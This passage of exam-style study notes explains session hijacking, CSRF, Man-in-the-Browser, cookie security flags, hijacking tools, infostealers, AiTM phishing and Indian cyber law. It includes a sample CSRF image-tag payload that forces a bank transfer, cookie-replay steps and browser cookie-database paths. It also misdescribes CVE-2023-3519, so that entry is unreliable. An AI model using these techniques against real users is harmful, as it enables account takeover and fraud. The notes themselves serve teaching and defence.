> without regenerating them are vulnerable to fixation variants.

---

### 6.5 Cross-Site Request Forgery (CSRF)

**WHAT:**
CSRF is an attack that forces the victim's browser to make an
**unauthorized HTTP request** to a target application where the
victim is already authenticated — exploiting the fact that the
browser automatically includes session cookies with every request.

**KEY DISTINCTION from session hijacking:**
- Session hijacking: attacker STEALS the token, uses it themselves
- CSRF: attacker NEVER GETS the token — instead tricks the victim's
  browser into making requests using its OWN (valid) session

**HOW:**

    Victim is logged into bank.example.com
    Victim's browser has: Cookie: SESSIONID=abc123xyz

    Attacker creates malicious page:
    <img src="https://bank.example.com/transfer?amount=10000&to=attacker_account">

    Victim visits attacker's page (via phishing link)
    Browser automatically loads the img URL
    Browser sends request to bank.example.com
    Browser AUTOMATICALLY includes session cookie:
      GET /transfer?amount=10000&to=attacker_account HTTP/1.1
      Cookie: SESSIONID=abc123xyz
    Bank processes: "Authenticated request to transfer $10,000"
    Transfer executes — victim never explicitly authorized it

**Attacker never sees the cookie — they just trigger a request
that the victim's browser makes on their behalf.**

**Countermeasures:**
- CSRF tokens (anti-CSRF tokens) — unique per-request tokens in forms
- `SameSite=Strict` cookie attribute — cookie not sent cross-site
- Re-authentication for sensitive actions (confirm password)
- Verify `Origin` and `Referer` headers

---

### 6.6 Man-in-the-Browser (MitB)

**WHAT:**
Man-in-the-Browser (MitB) is an attack where **Trojan/malware
infects the browser itself** — intercepting and modifying
transactions from inside the browser — after they are decrypted
by TLS but before they are displayed to or confirmed by the user.

**WHY it bypasses HTTPS:**
TLS encrypts traffic between browser and server. MitB operates
INSIDE the browser — after TLS decryption. The malware sees the
plaintext data, the session tokens, and can modify requests before
they are encrypted and sent — making HTTPS inspection irrelevant.

**HOW:**

    Victim's browser infected with MitB Trojan (via drive-by, phishing)
    Trojan installs as browser extension or hooks browser APIs
            ↓
    Victim logs into banking site (over HTTPS)
    Session is encrypted — network sniffer sees nothing useful
            ↓
    Victim initiates £100 transfer to friend
    MitB Trojan intercepts the form submission:
      Changes recipient: friend → attacker's account
      Changes amount: £100 → £10,000
    Trojan forwards modified request to server
            ↓
    Bank processes modified transaction
    Bank's confirmation page says "£100 to friend" (MitB modifies display)
    Victim sees normal confirmation — unaware of modification
            ↓
    Attacker receives £10,000

**Famous MitB Trojans:** Zeus, SpyEye, URLZone, Gozi

**Countermeasures:**
- Transaction signing with out-of-band confirmation (SMS OTP)
- Anti-MitB browser extensions
- Mutual TLS (client certificates)
- Behavioural analytics detecting transaction anomalies

---

## Section 7 — Prevention of Session Hijacking

### 7.1 Encryption-Based Prevention

**The foundation:** Encryption makes captured tokens useless
to attackers who intercept network traffic — they see ciphertext,
not the session token.

| Control | Implementation | What It Prevents |
|---|---|---|
| **HTTPS everywhere** | TLS 1.2/1.3 for all pages — not just login | Network-level token sniffing |
| **Secure cookie flag** | `Set-Cookie: SESS=...; Secure` | Cookie only sent over HTTPS |
| **HSTS** | HTTP Strict Transport Security header | Downgrade attacks, SSL stripping |
| **TLS certificate validation** | Certificate pinning in mobile apps | MITM-based sniffing |
| **VPN** | All traffic encrypted at VPN layer | Network-level interception |
| **End-to-end encryption** | Application-level encryption of sensitive fields | Even if TLS stripped, data protected |

> [!IMPORTANT]
> HTTPS alone is not sufficient if the `Secure` cookie flag is
> not set. A browser will send cookies over HTTP even if the
> original site is HTTPS — if the `Secure` flag is missing.
> A single HTTP request (even from an embedded image or
> redirect) will leak the session cookie in cleartext.

---

### 7.2 Token Security Measures

| Control | Implementation | What It Prevents |
|---|---|---|
| **HttpOnly flag** | `Set-Cookie: SESS=...; HttpOnly` | XSS-based cookie theft via JavaScript |
| **SameSite=Strict** | `Set-Cookie: SESS=...; SameSite=Strict` | CSRF attacks — cookie not sent cross-site |
| **Strong token generation** | Cryptographically secure random (128+ bits) | Token prediction/brute force |
| **Short token lifetime** | 15–30 minute timeout for sensitive applications | Limits window for stolen token use |
| **Session regeneration after login** | `session_regenerate_id(true)` on authentication | Session fixation |
| **Session invalidation on logout** | Delete session from server-side store | Post-logout token reuse |
| **No token in URL** | Use cookies — not query string parameters | Referer leakage, log exposure |
| **Token binding** | Bind token to TLS channel or client certificate | Token replay from different client |

---

### 7.3 Server-Side Controls

| Control | What It Does |
|---|---|
| **Absolute session timeout** | Invalidate session after maximum duration (e.g., 8 hours) regardless of activity |
| **Idle session timeout** | Invalidate session after period of inactivity (e.g., 15 minutes) |
| **Concurrent session limits** | Allow only one active session per user — new login invalidates old |
| **IP binding** | Tie session to the IP that created it — reject if IP changes mid-session |
| **User agent binding** | Tie session to browser User-Agent — reject if changed |
| **Re-authentication for sensitive ops** | Require password confirmation before account changes |
| **Session inventory** | Allow users to see/manage all active sessions |
| **Anomaly detection** | Detect geographic impossibility (session used from two countries simultaneously) |

> [!NOTE]
> IP binding and User-Agent binding are security vs usability
> trade-offs. Mobile users frequently change IPs (cellular to
> WiFi). Binding to IP causes session invalidation for legitimate
> mobile users. These controls are appropriate for high-security
> admin sessions but may frustrate regular users.

---

### 7.4 Network-Level Prevention

| Control | What It Prevents |
|---|---|
| **Use switches not hubs** | Passive sniffing of session tokens |
| **Dynamic ARP Inspection (DAI)** | ARP poisoning that enables MITM token capture |
| **HTTPS enforcement at proxy** | Cleartext token transmission through network |
| **Network segmentation** | Limits who can reach the same network segment |
| **IDS/IPS monitoring** | ACK storms (indicating TCP session hijacking in progress) |
| **VPN for remote access** | All session traffic encrypted at network layer |
| **WiFi security (WPA3)** | Wireless sniffing of session tokens |

---

### 7.5 Application Framework Controls

| Framework/Language | Secure Session Control |
|---|---|
| **PHP** | `session.cookie_httponly = 1`, `session.cookie_secure = 1`, `session_regenerate_id(true)` |
| **Java/Spring** | `HttpOnly`, `Secure`, `SameSite` cookie configuration in `SecurityConfig` |
| **Python/Django** | `SESSION_COOKIE_HTTPONLY = True`, `SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_SAMESITE = 'Strict'` |
| **Node.js/Express** | `express-session` with `httpOnly: true`, `secure: true`, `sameSite: 'strict'` |
| **ASP.NET** | `<httpCookies requireSSL="true" httpOnlyCookies="true" />` in web.config |

---

## 📌 Extra Notes

### E1 — TCP Sequence Number Prediction — Deep Dive

> [!NOTE]
> TCP ISN prediction was the primary TCP session hijacking method
> historically. RFC 6528 effectively ended this — know the history
> for MCQs.

**The historical vulnerability:**
Early TCP implementations used predictable ISN (Initial Sequence
Number) generation — either sequential (ISN += 64000 per second)
or time-based. An attacker who could observe a few TCP connections
could predict the ISN of the next connection.

**Attack scenario (Mitnick attack, 1994):**

    Attacker wants to impersonate trusted_host to target:

    STEP 1 — DoS trusted_host (flood it — cannot respond to RSTs)
    STEP 2 — Observe TCP connections from other hosts to target
             Record ISN values: 1000, 65000, 129000... (sequential)
    STEP 3 — Predict next ISN: ~193000
    STEP 4 — Send SYN to target with source = trusted_host IP
    STEP 5 — Target sends SYN-ACK to trusted_host (which is DoS'd)
    STEP 6 — Attacker sends ACK with predicted ISN (193001)
    STEP 7 — Target accepts — connection established as trusted_host

**Kevin Mitnick attacked Tsutomu Shimomura's computers using
this exact technique on Christmas Day 1994 — the first famous
demonstration of TCP session hijacking in the wild.**

**The fix — RFC 6528 (2012):**
Requires TCP implementations to use cryptographically randomized
ISNs — making prediction computationally infeasible.
ISN = F(local IP, local port, remote IP, remote port, secret)
where F is a PRF (pseudorandom function) seeded with a secret.

All modern operating systems (Linux, Windows, macOS, BSD) implement
RFC 6528 — TCP ISN prediction attacks are not feasible against
modern stacks.

---

### E2 — HTTP Cookie Attributes — Security Reference

> [!NOTE]
> Cookie security attributes are heavily MCQ-tested — know each
> attribute, what it does, and what attack it prevents.

| Attribute | Value | What It Does | Attack Prevented |
|---|---|---|---|
| `Secure` | Flag (no value) | Cookie ONLY sent over HTTPS | Network sniffing, SSL stripping |
| `HttpOnly` | Flag (no value) | JavaScript CANNOT read cookie | XSS-based cookie theft |
| `SameSite=Strict` | String | Cookie NOT sent in any cross-site request | CSRF |
| `SameSite=Lax` | String | Cookie sent in cross-site top-level navigation | Most CSRF |
| `SameSite=None` | String | Cookie sent everywhere (requires Secure) | — (used for legitimate cross-site) |
| `Domain` | domain.com | Cookie sent to this domain and subdomains | Scope control |
| `Path` | /app | Cookie only sent for requests to this path | Scope control |
| `Max-Age` | seconds | Cookie lifetime in seconds | Long-lived session risk |
| `Expires` | date | Cookie expiry date | Long-lived session risk |

**The ideal session cookie:**

    Set-Cookie: SESSIONID=<128-bit-random>;
      Secure;
      HttpOnly;
      SameSite=Strict;
      Path=/;
      Max-Age=1800

This cookie:
- Only travels over HTTPS (`Secure`)
- Cannot be read by JavaScript (`HttpOnly`)
- Not sent in cross-site requests (`SameSite=Strict`)
- Expires after 30 minutes (`Max-Age=1800`)

---

### E3 — Session Hijacking Tools

> [!NOTE]
> Know the tools, their purpose, and what they target.

| Tool | Type | What It Does |
|---|---|---|
| **Ettercap** | MITM + sniffing | ARP poisoning → intercept session cookies in cleartext traffic |
| **Bettercap** | MITM + sniffing | Modern Ettercap — HTTP/HTTPS cookie capture |
| **Hamster + Ferret** | Cookie sidejacking | Ferret captures cookies from Wi-Fi; Hamster replays them as proxy |
| **Firesheep** | Wi-Fi cookie theft | Firefox extension capturing cookies from open Wi-Fi (2010) |
| **Burp Suite** | Web proxy + session manipulation | Intercept, modify, replay HTTP sessions and cookies |
| **Cookie Cadger** | Wi-Fi cookie capture | Passive capture of session cookies from unencrypted Wi-Fi |
| **Juggernaut** | TCP session hijacking | Linux tool for TCP-level session hijacking |
| **Hunt** | TCP session hijacking | Sniff and hijack TCP sessions |
| **T-Sight** | TCP session monitoring | Windows-based TCP session watcher |
| **OWASP ZAP** | Web app testing | Session token analysis, CSRF testing |
| **sqlmap** | Database sessions | SQL injection leading to session compromise |

**Burp Suite for session testing:**

    1. Configure browser to use Burp as proxy (127.0.0.1:8080)
    2. Intercept authenticated request
    3. Send to Repeater tab
    4. Modify Cookie header → replay request
    5. Observe server response → confirm token validity
    6. Use Sequencer to analyze token randomness quality

---

### E4 — Firesheep — Historical Context

> [!NOTE]
> Firesheep (2010) is a historically significant tool that
> triggered mass adoption of HTTPS — referenced in security
> literature and potentially MCQ-tested.

**What was Firesheep:**
A Firefox browser extension released by Eric Butler at ToorCon 12
(October 2010). It automated Wi-Fi session cookie theft with a
simple point-and-click interface — making session hijacking
accessible to anyone with no technical knowledge.

**How it worked:**
- User installs Firesheep Firefox extension
- User opens Firefox on a public Wi-Fi network
- Firesheep captures HTTP traffic on the Wi-Fi (passive sniffing)
- Displays a sidebar showing authenticated users of sites like
  Facebook, Twitter, Amazon, Google (all HTTP at the time)
- User double-clicks on a person in the sidebar
- Firesheep replays their session cookie → user is logged in as victim
- Zero technical knowledge required

**Why it was significant:**
Before Firesheep, session hijacking on Wi-Fi was a known threat
but required technical skill. Firesheep made it trivial — one
click to steal a Facebook session on a coffee shop Wi-Fi.
Within weeks of release:
- Facebook began rolling out HTTPS everywhere
- Twitter enabled HTTPS
- Google made HTTPS default for Gmail (had been optional)
- Electronic Frontier Foundation launched HTTPS Everywhere
- Accelerated industry-wide HTTPS adoption by years

**Downloads:** Over 1 million in first week of release.
**Legal status:** Using Firesheep against others without consent
is illegal under the CFAA (US), Computer Misuse Act (UK),
and IT Act 2000 (India).

---

### E5 — Session Hijacking vs MITM vs Sniffing

> [!NOTE]
> These three are frequently confused — understand how they relate.

| Attack | What Happens | Attacker Gets |
|---|---|---|
| **Sniffing** | Passively captures network traffic | Copy of all packets — credentials, tokens, data |
| **MITM** | Positions between client and server — sees all traffic | Real-time interception, can modify traffic |
| **Session Hijacking** | Uses a captured/stolen token to impersonate victim | Access to victim's authenticated session |

**Relationship:**

    Sniffing ──────────────→ Session Hijacking
    (capture token)          (replay token)

    MITM ──────────────────→ Session Hijacking
    (intercept token in       (replay token) OR
    real time)               (modify traffic directly)

    Session Fixation ───────→ Session Hijacking
    (plant known token)       (use planted token
                               after victim logs in)

Sniffing and MITM are ENABLING techniques that can lead to
session hijacking. Session hijacking is the OUTCOME of those
techniques when a session token is captured and replayed.

---

### E6 — OAuth Token Hijacking

> [!NOTE]
> Modern applications use OAuth/OIDC — token hijacking
> has evolved beyond HTTP cookies to include access tokens.

**What is OAuth:**
OAuth 2.0 is an authorization framework allowing applications
to obtain limited access to user accounts on third-party services
(Google, Facebook, GitHub) using access tokens and refresh tokens.

**OAuth token types:**

| Token | Purpose | Lifetime |
|---|---|---|
| **Access Token** | Authorize API requests | Short (minutes to hours) |
| **Refresh Token** | Obtain new access tokens | Long (days to months) |
| **ID Token (OIDC)** | Authenticate user identity (JWT) | Short |

**OAuth token hijacking methods:**

| Method | How |
|---|---|
| **Authorization code interception** | Steal authorization code from redirect URI before it is exchanged for token |
| **Access token theft** | Steal access token from browser storage (localStorage — accessible to XSS) |
| **Refresh token theft** | Steal long-lived refresh token → generate unlimited access tokens |
| **Open redirect abuse** | OAuth redirect_uri validation weak → redirect code to attacker |
| **PKCE bypass** | Code challenge bypass in mobile/SPA flows |

**Why localStorage is dangerous for tokens:**
Many SPAs store JWT access tokens in `localStorage` —
which is accessible to ANY JavaScript on the page.
XSS → `localStorage.getItem('access_token')` → token stolen.
Better storage: **HttpOnly cookies** (not accessible to JavaScript)
or **in-memory only** (cleared on page refresh — limits persistence).

---

### E7 — Predecessor / Successor Chains

> [!NOTE]
> Understanding how session hijacking evolved explains why
> modern attacks focus on application-layer tokens.

**Session Hijacking Evolution:**

    TCP ISN prediction (1985–1994)
    — Sequential ISNs predictable — Mitnick attack (1994)
            ↓
    TCP ISN randomization (RFC 1948 → RFC 6528)
    — TCP-level hijacking becomes infeasible
            ↓
    HTTP cookie theft via sniffing (1995–2005)
    — HTTP is cleartext — cookies sniffable on LAN
            ↓
    HTTPS adoption (gradual — accelerated post-Firesheep 2010)
    — Sniffing defeated — but...
            ↓
    XSS-based cookie theft (1999–present)
    — No network access needed — inject JavaScript
            ↓
    HttpOnly cookie attribute (IE6 2002, widely adopted 2005+)
    — XSS cannot read HttpOnly cookies — but...
            ↓
    Session fixation attacks (2002–present)
    — Plant token before login — bypass HttpOnly
            ↓
    CSRF attacks (2001–present)
    — No token theft needed — forge requests from victim's browser
            ↓
    SameSite cookie attribute (Chrome 2016, standard 2019)
    — Mitigates CSRF — but...
            ↓
    Man-in-the-Browser (2006–present)
    — Bypasses all network and cookie controls — operates inside browser
            ↓
    OAuth/JWT token hijacking (2012–present)
    — New token formats — same steal-and-replay concept
            ↓
    AI-assisted token analysis and session prediction (2023+)

---

### E8 — Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **Spoofing vs Hijacking** | "Spoofing steals a session" | FALSE. Spoofing FAKES identity for a NEW transaction. Hijacking STEALS an EXISTING session. Fundamentally different. |
| **Session Fixation vs Hijacking** | "Both steal a valid token" | DIFFERENT. Fixation PLANTS a known token BEFORE login. Hijacking STEALS a valid token AFTER login. |
| **CSRF vs XSS** | "CSRF steals the cookie" | CSRF never steals the cookie — it FORCES the victim's browser to use its own cookie to make attacker-chosen requests. XSS steals the cookie. |
| **Active vs Passive hijacking** | "Active is always preferable" | Active gives direct control but is NOISY and detectable. Passive is stealthier — attacker collects tokens without alerting the victim. |
| **HttpOnly prevents all session hijacking** | "Set HttpOnly — sessions are safe" | HttpOnly only prevents JavaScript from reading cookies. Network sniffing (if HTTP), session fixation, CSRF, and Man-in-the-Browser still work around it. |
| **HTTPS prevents all session hijacking** | "Use HTTPS — sessions are safe" | HTTPS prevents sniffing but not XSS, session fixation, CSRF, MitB, or stolen laptop attacks. Multiple layers required. |
| **ACK storm is an attack** | "Attackers launch ACK storms" | ACK storms are a SIDE EFFECT of TCP session hijacking — caused by desynchronization. Attackers try to suppress them (via RST), not launch them. |
| **Session timeout prevents hijacking** | "15-minute timeout secures sessions" | Timeout limits the window for using a stolen token AFTER capture but does NOT prevent theft. Token must still be secured against theft. |
| **Session donation = session fixation** | "Donation and fixation are the same" | DIFFERENT GOAL. Fixation: attacker plants ID to GAIN ACCESS. Donation: attacker donates THEIR AUTHENTICATED session to victim so victim USES attacker's account (and enters data attacker wants). |
| **JWT cannot be hijacked** | "JWT is signed — safe from hijacking" | JWT signature verifies INTEGRITY (not tampered), not AUTHENTICITY of presenter. If a JWT is stolen and replayed before expiry, the server accepts it — signing does not prevent theft and replay. |

---

### E9 — Current Landscape 2026

> [!NOTE]
> Current state of session hijacking threats and defences.

**Modern Infostealer Malware (2023–2026):**
The dominant session hijacking threat in 2025–2026 is not
network-level or XSS-based — it is **infostealer malware** that
extracts session cookies directly from browser storage files.

Browsers store session cookies in SQLite databases on disk:
- Chrome: `%APPDATA%\Local\Google\Chrome\User Data\Default\Cookies`
- Firefox: `%APPDATA%\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite`

Infostealers (RedLine, Raccoon, Vidar, Lumma) read these files
directly from disk — extracting ALL session cookies for ALL sites.
Stolen sessions are sold on dark web markets (Genesis Market,
Russian Market) — buyers import cookies into Chrome → instant
authenticated access to victim accounts.

**2FA Bypass via Session Cookie Theft (2023–2025):**
Two-factor authentication (2FA/MFA) protects the LOGIN process —
not the session. If a session cookie is stolen AFTER 2FA completes,
the attacker uses the cookie directly — 2FA is irrelevant because
authentication already happened. Attackers specifically target
post-authentication session cookies to bypass MFA entirely.

**Adversary-in-the-Middle (AiTM) Phishing Kits (2022–2026):**
AiTM kits (Evilginx2, Modlishka, Muraena) operate a reverse proxy
between victim and real site. Victim authenticates (including MFA)
to the AiTM proxy — proxy forwards to real site — real site sends
back authenticated session cookie — AiTM proxy captures cookie.
Victim has a real session on the real site — and so does the
attacker. Bypasses MFA completely.

**Tool Evilginx2:**
Open-source AiTM phishing framework — captures session cookies
in real time even for MFA-protected accounts. Widely used in
targeted attacks against Microsoft 365, Google Workspace accounts.

**Relevant CVEs:**
- **CVE-2023-3519 (Citrix NetScaler — 2023):**
  Session token injection vulnerability — attacker could capture
  authenticated sessions without credentials. CVSS 9.8.
  Actively exploited before patch. Thousands of Citrix appliances
  compromised globally.
- **CVE-2024-21413 (Microsoft Outlook — 2024):**
  NTLM credential theft via crafted email link — related to
  session credential capture. CVSS 9.8.
- **CVE-2022-22965 (Spring4Shell — 2022):**
  RCE in Spring Framework enabling session store compromise.

---

### E10 — Indian Legal Context

> [!NOTE]
> Indian law applicable to session hijacking and identity spoofing.

| Law | Section | Offence | Penalty |
|---|---|---|---|
| **IT Act 2000** | **S.43(a)** | Unauthorized access to computer — session hijacking to access victim's account | Civil compensation up to ₹1 crore |
| **IT Act 2000** | **S.66** | Criminal unauthorized access via session hijacking | Up to 3 years + ₹5 lakh fine |
| **IT Act 2000** | **S.66C** | Identity theft — using stolen session/credentials to impersonate someone online | Up to 3 years + ₹1 lakh fine |
| **IT Act 2000** | **S.66D** | Cheating by personation using computer/internet — impersonating victim via hijacked session | Up to 3 years + ₹1 lakh fine |
| **IT Act 2000** | **S.43(b)** | Downloading or extracting data from victim's account via hijacked session | Civil compensation up to ₹1 crore |
| **IT Act 2000** | **S.72** | Breach of confidentiality — accessing victim's private data via session | Up to 2 years + ₹1 lakh fine |
| **IPC** | **S.419** | Cheating by impersonation — using hijacked session to impersonate victim | Up to 3 years + fine |
| **IPC** | **S.420** | Fraud — financial transactions via hijacked banking session | Up to 7 years + fine |
| **DPDPA 2023** | — | Personal data accessed via session hijacking → breach notification required | Penalty up to ₹250 crore |

> [!IMPORTANT]
> **Section 66C** (identity theft) and **Section 66D** (cheating by
> personation using computer) are the most directly applicable
> provisions for session hijacking — they specifically target
> using stolen digital identity to impersonate someone.
> **Section 66C** is frequently MCQ-tested as "which section
> covers online identity theft?"

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Technical Meaning |
|---|---|---|
| **AiTM** | Adversary-in-the-Middle | Reverse proxy phishing attack capturing session cookies post-MFA |
| **API** | Application Programming Interface | Interface for programmatic access — uses tokens for session authentication |
| **CFAA** | Computer Fraud and Abuse Act | US federal computer crime law |
| **CSRF** | Cross-Site Request Forgery | Forces victim's browser to make unauthorized requests using their own session |
| **DOM** | Document Object Model | Browser's internal representation of HTML page — XSS target |
| **DPDPA** | Digital Personal Data Protection Act | India's 2023 data protection legislation |
| **HSTS** | HTTP Strict Transport Security | Browser policy enforcing HTTPS — prevents SSL stripping |
| **HTTP** | Hypertext Transfer Protocol | Stateless application protocol — cleartext — session tokens visible |
| **HTTPS** | HTTP Secure | HTTP over TLS — encrypts all content including session cookies |
| **ISN** | Initial Sequence Number | TCP connection's starting sequence number — historically predictable |
| **JWT** | JSON Web Token | Signed token format for stateless session authentication |
| **MFA** | Multi-Factor Authentication | Authentication requiring two or more verification factors |
| **MitB** | Man-in-the-Browser | Trojan operating inside browser — intercepts transactions after TLS decryption |
| **MITM** | Man-in-the-Middle | Attacker positioned between client and server — sees all traffic |
| **OAuth** | Open Authorization | Authorization framework for delegated third-party access using tokens |
| **OIDC** | OpenID Connect | Identity layer built on OAuth 2.0 — provides ID tokens |
| **OTP** | One-Time Password | Single-use authentication code — used in 2FA |
| **PKCE** | Proof Key for Code Exchange | OAuth security extension for public clients |
| **PRF** | Pseudorandom Function | Cryptographic function for generating unpredictable values |
| **RST** | Reset | TCP flag forcibly terminating a connection |
| **SPA** | Single Page Application | Web app using JavaScript framework — commonly stores JWT in localStorage |
| **SQL** | Structured Query Language | Database query language — SQL injection can compromise sessions |
| **TLS** | Transport Layer Security | Cryptographic protocol for encrypted network communication |
| **UUID** | Universally Unique Identifier | 128-bit identifier — v4 is cryptographically random — used for session IDs |
| **XSS** | Cross-Site Scripting | Injection of malicious JavaScript into web pages viewed by victims |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**

`Spoofing` · `Session Hijacking` · `Cookie Theft` · `Session Token` ·
`Active Hijacking` · `Passive Hijacking` · `TCP Session Hijacking` ·
`Sequence Number` · `Desynchronization` · `ACK Storm` ·
`Session Fixation` · `Session Donation` · `XSS` · `CSRF` ·
`Man-in-the-Browser` · `Cookie Sniffing` · `HttpOnly` · `Secure Flag` ·
`SameSite` · `HSTS` · `Session Regeneration` · `Session Timeout` ·
`Firesheep` · `Evilginx2` · `AiTM` · `OAuth` · `JWT` ·
`Reflected XSS` · `Stored XSS` · `DOM XSS` · `Anti-CSRF Token` ·
`IP Spoofing` · `Email Spoofing` · `T1539` · `T1185` · `T1557`

---

**Concept Map:**

    SPOOFING vs HIJACKING
    │
    ├── SPOOFING
    │   ├── Definition ──── Fake identity for NEW transaction — no prior session
    │   └── Types ──────── IP | MAC | ARP | DNS | Email | Website | Caller ID
    │
    ├── SESSION HIJACKING
    │   ├── Definition ──── Steal EXISTING authenticated session token
    │   ├── Why possible ── HTTP stateless → tokens → theft = impersonation
    │   │
    │   ├── BY ACTIVITY
    │   │   ├── Active ─── Attacker sends packets — noisy — victim disrupted
    │   │   └── Passive ── Attacker monitors — silent — token collected later
    │   │
    │   ├── BY LAYER
    │   │   ├── Network (TCP) ── Seq number injection → desync → ACK storm
    │   │   └── Application ─── Cookie theft | XSS | Fixation | CSRF | MitB
    │   │
    │   ├── TECHNIQUES
    │   │   ├── Cookie sniffing ── HTTP cleartext → Wireshark captures token
    │   │   ├── XSS ──────────── JavaScript steals document.cookie
    │   │   ├── Session Fixation  Plant known ID before login → auth validates it
    │   │   ├── CSRF ─────────── Force victim's browser to use its own session
    │   │   └── MitB ─────────── Trojan inside browser → bypass TLS
    │   │
    │   ├── STEPS
    │   │   ├── 1. Sniff traffic (passive/active)
    │   │   ├── 2. Monitor session (identify token)
    │   │   ├── 3. Predict/steal token
    │   │   ├── 4. Take over session
    │   │   └── 5. Execute commands as victim
    │   │
    │   └── PREVENTION
    │       ├── Encryption ──── HTTPS + Secure flag + HSTS
    │       ├── Cookie flags ── HttpOnly + SameSite=Strict
    │       ├── Token quality ─ 128-bit random + short lifetime
    │       ├── Server-side ─── Timeout + Regenerate ID + Invalidate on logout
    │       └── Network ─────── DAI + Switches + VPN + WPA3

---

## ⚡ Quick Reference Cheatsheet

### 🆚 Spoofing vs Hijacking

| Property | Spoofing | Hijacking |
|---|---|---|
| Session required? | ❌ No | ✅ Yes |
| What is faked/stolen? | Identity (IP, MAC, email) | Session token |
| Authentication bypassed? | ✅ Yes (fakes identity) | ✅ Yes (steals proof) |
| Victim logged in? | Not required | Must be |
| Example | IP spoof in SYN flood | Cookie replay |

---

### 🔑 Session Token Security Attributes

| Cookie Attribute | Prevents | Without It |
|---|---|---|
| `Secure` | Network sniffing of token | Token sent over HTTP — visible to sniffer |
| `HttpOnly` | XSS JavaScript theft | `document.cookie` returns token |
| `SameSite=Strict` | CSRF | Browser sends cookie in cross-site requests |
| Short `Max-Age` | Long-window token reuse | Stolen token valid indefinitely |

**Ideal session cookie:**

    Set-Cookie: SESSIONID=<128-bit-random>; Secure; HttpOnly; SameSite=Strict; Max-Age=1800

---

### 🎭 Session Hijacking Techniques

| Technique | What Is Stolen/Exploited | Key Countermeasure |
|---|---|---|
| Cookie sniffing | HTTP cookie from network | HTTPS + Secure flag |
| XSS cookie theft | document.cookie via JavaScript | HttpOnly flag |
| Session fixation | Pre-planted session ID | session_regenerate_id() after login |
| Session donation | Attacker's session given to victim | Same as fixation |
| CSRF | Victim's browser submits request | SameSite=Strict + CSRF tokens |
| MitB | Browser-level transaction interception | Out-of-band confirmation (OTP) |
| TCP seq injection | TCP sequence numbers | TLS (encrypt session) + RFC 6528 |
| Token prediction | Weak random session IDs | Cryptographic PRNG (128+ bits) |

---

### ⚡ Active vs Passive Hijacking

| Property | Active | Passive |
|---|---|---|
| Attacker sends packets? | ✅ Yes | ❌ No |
| Victim disrupted? | ✅ Yes | ❌ No |
| Detectability | High | Very low |
| What attacker gains | Direct session control | Token + session data |
| Timing | Real-time during session | Token collected, used later |
| TCP side effect | ACK storm | None |

---

### 🔄 Session Fixation vs Session Hijacking

| | Session Fixation | Session Hijacking |
|---|---|---|
| When is token obtained? | BEFORE victim logs in | AFTER victim logs in |
| How is token obtained? | Attacker PLANTS known token | Attacker STEALS valid token |
| Victim's login? | Required — validates planted token | Required — created the token |
| Countermeasure | Regenerate ID after login | HttpOnly + HTTPS + timeout |

---

### 🆚 XSS vs CSRF

| Property | XSS | CSRF |
|---|---|---|
| Cookie stolen? | ✅ Yes (document.cookie) | ❌ No |
| Attacker uses cookie? | ✅ Yes — replays it | ❌ No — victim's browser uses it |
| Victim interaction? | View XSS-injected page | Click attacker's link/page |
| Countermeasure | HttpOnly cookie | SameSite + CSRF token |
| What attacker gets | Token to use later | Forced action executed by victim |

---

### ⚖️ Indian Legal Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.43(a) | Unauthorized access via hijacking | Civil ₹1 crore |
| IT Act 2000 | S.66 | Criminal unauthorized access | 3 yrs + ₹5L |
| IT Act 2000 | S.66C | Identity theft online | 3 yrs + ₹1L |
| IT Act 2000 | S.66D | Cheating by online personation | 3 yrs + ₹1L |
| IT Act 2000 | S.72 | Breach of confidentiality | 2 yrs + ₹1L |
| IPC | S.419 | Cheating by impersonation | 3 yrs + fine |
| IPC | S.420 | Fraud via hijacked session | 7 yrs + fine |
| DPDPA 2023 | — | Data breach via session access | ₹250 crore |

---

### 📅 Key Historical References

| Year | Event | Significance |
|---|---|---|
| 1994 | Mitnick attack on Shimomura | First famous TCP ISN prediction hijack |
| 1995 | HTTP cookies introduced (Netscape) | Created session management — and the attack surface |
| 1999 | First XSS described | JavaScript cookie theft becomes possible |
| 2001 | CSRF attacks documented | Session abuse without token theft |
| 2006 | Man-in-the-Browser (Zeus) | Browser-level session manipulation bypasses TLS |
| 2010 | Firesheep released | One-click Wi-Fi cookie theft — accelerated HTTPS adoption |
| 2012 | RFC 6528 — TCP ISN randomization | TCP-level session hijacking effectively ended |
| 2016 | Chrome SameSite cookie attribute | Browser-level CSRF mitigation |
| 2022+ | AiTM kits (Evilginx2) | MFA-bypassing session cookie capture at scale |

---

## ✅ Session Revision Snapshot

### ⚡ TL;DR — 5 Bullets

1. **Spoofing fakes a NEW identity; hijacking STEALS an EXISTING
   authenticated session.** Spoofing needs no prior session — it
   forges an identity from scratch (IP, MAC, email). Hijacking
   requires the victim to be already authenticated — the attacker
   steals the session token that proves that authentication.

2. **Active hijacking sends packets and disrupts the victim (noisy);
   passive hijacking silently monitors and collects tokens (stealthy).**
   TCP session hijacking at the network level requires correct sequence
   numbers — desynchronization causes an ACK storm as a side effect.
   Modern attacks focus on application-layer token theft — not TCP.

3. **Session hijacking has five steps: Sniff → Monitor → Predict/Steal
   → Take over → Execute.** Application-layer techniques (XSS, fixation,
   CSRF, MitB) dominate modern attacks because TCP ISN randomization
   (RFC 6528) made network-level hijacking infeasible on modern stacks.

4. **Session fixation plants a known token BEFORE login; session
   hijacking steals a valid token AFTER login.** Fix: always call
   `session_regenerate_id(true)` immediately after successful
   authentication. XSS steals tokens via `document.cookie` —
   `HttpOnly` flag blocks this. CSRF abuses the victim's own session
   without stealing the token — `SameSite=Strict` blocks CSRF.

5. **The ideal session cookie is: Secure + HttpOnly + SameSite=Strict
   + 128-bit random + short Max-Age.** Each attribute blocks a specific
   attack vector. Modern threats include AiTM phishing (Evilginx2)
   capturing cookies post-MFA, and infostealer malware reading browser
   cookie databases from disk — bypassing all cookie security flags.

---

### 🎯 MCQ-Likely Concepts

- [ ] Spoofing vs hijacking — no session vs existing session
- [ ] Active vs passive hijacking — noisy vs stealthy
- [ ] TCP session hijacking — sequence number requirement
- [ ] Desynchronization — what causes it, what it produces
- [ ] ACK storm — definition, cause, detection value
- [ ] Session fixation — plant BEFORE login, victim login validates
- [ ] Session fixation countermeasure — session_regenerate_id()
- [ ] XSS for session hijacking — document.cookie exfiltration
- [ ] HttpOnly — blocks JavaScript cookie access — XSS protection
